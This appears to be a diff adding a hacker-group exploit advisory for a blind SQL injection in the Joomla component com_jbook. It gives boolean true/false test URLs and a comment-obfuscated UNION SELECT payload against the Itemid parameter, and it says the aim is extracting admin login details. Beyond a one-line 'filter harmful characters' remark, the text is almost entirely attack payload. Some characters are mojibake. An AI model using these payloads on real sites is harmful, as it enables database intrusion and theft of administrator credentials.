@@ -1,0 +1,30 @@
+#############################################################
+#        Joomla Component com_jbook Blind SQL-injection Vulnerability                                      #
+#############################################################
+
+# author        : Fl0riX 
+# Greetz    : BARCOD3 , Septemb0x, Deep-Power,DreamPower,Pyske,F0rtys3v3n,BlackApple
+# Name         : com_jbook
+
+# Bug Type    : Blind SQL Injection
+
+# Infection     : Admin login bilgileri al&#65533;nabilir.
+
+# Demo Vuln.  :
+TRUE(+)
+&#65533; http:/server/index.php?option=com_jbook&Itemid=90 and 1=1
+FALSE(-)
+&#65533; http://server/index.php?option=com_jbook&Itemid=90 and 1=0
+
+# Bug Fix Advice : Zararl&#65533; karakterler filtrelenmelidir.
+
+# Greez : KinqSqlZ Crew
+#############################################################
+
+< ------------------- header data end of ------------------- >
+
+< -- bug code start -- >
+
+path/index.php?option=com_jbook&Itemid=null/**/and/**/1=0/**/union/**/select/**/0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+
+< -- bug code end of -- >
